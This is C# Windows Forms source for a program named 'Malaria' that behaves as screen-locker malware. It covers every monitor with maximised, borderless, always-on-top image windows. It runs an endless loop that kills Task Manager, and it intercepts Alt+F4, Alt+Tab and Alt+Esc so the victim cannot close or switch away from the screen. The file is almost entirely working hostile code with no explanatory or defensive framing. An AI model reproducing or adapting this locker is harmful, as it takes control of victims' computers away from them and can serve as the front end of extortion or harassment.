using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Malaria.Properties;

namespace Malaria
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            StartPosition = FormStartPosition.CenterScreen;
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Maximized;
            TopMost = true;
            BackgroundImageLayout = ImageLayout.Stretch;
            DisplayImageOnAllScreens();
            new Thread(KillTaskManager).Start();
            this.KeyPreview = true;
        }
        private static void DisplayImageOnAllScreens()
        {
            foreach (var screen in Screen.AllScreens)
            {
                var form = new Form
                {
                    StartPosition = FormStartPosition.CenterScreen,
                    Location = screen.Bounds.Location,
                    Size = screen.Bounds.Size,
                    FormBorderStyle = FormBorderStyle.None,
                    WindowState = FormWindowState.Maximized,
                    TopMost = true,
                    BackgroundImageLayout = ImageLayout.Stretch
                };

                var imageResource = Resources.ResourceManager.GetObject("bg");
                form.BackgroundImage = imageResource switch
                {
                    byte[] imageBytes => Image.FromStream(new MemoryStream(imageBytes)),
                    Image image => image,
                    _ => form.BackgroundImage
                };

                form.Show();
            }
        }
        private static void KillTaskManager()
        {
            while (true)
            {
                var processes = Process.GetProcessesByName("taskmgr");
                foreach (var process in processes) process.Kill();
            }
        }
        protected override void WndProc(ref Message m)
        {
            const int WM_SYSCOMMAND = 0x0112;
            const int SC_CLOSE = 0xF060;
            const int WM_KEYDOWN = 0x0100;
            const int WM_KEYUP = 0x0101;

            // Block system close commands (Alt+F4)
            if (m.Msg == WM_SYSCOMMAND && (int)m.WParam == SC_CLOSE)
            {
                return; // Prevent closing the window
            }

            // Intercept key presses to block Alt+Tab
            if (m.Msg == WM_KEYDOWN || m.Msg == WM_KEYUP)
            {
                Keys key = (Keys)m.WParam.ToInt32();

                // Detect Alt+Tab combination
                if ((Control.ModifierKeys & Keys.Alt) != 0 && key == Keys.Tab)
                {
                    return; // Prevent Alt+Tab
                }

                // Detect Alt+Esc combination (another window-switching shortcut)
                if ((Control.ModifierKeys & Keys.Alt) != 0 && key == Keys.Escape)
                {
                    return; // Prevent Alt+Esc
                }
            }

            base.WndProc(ref m);
        }

    }
}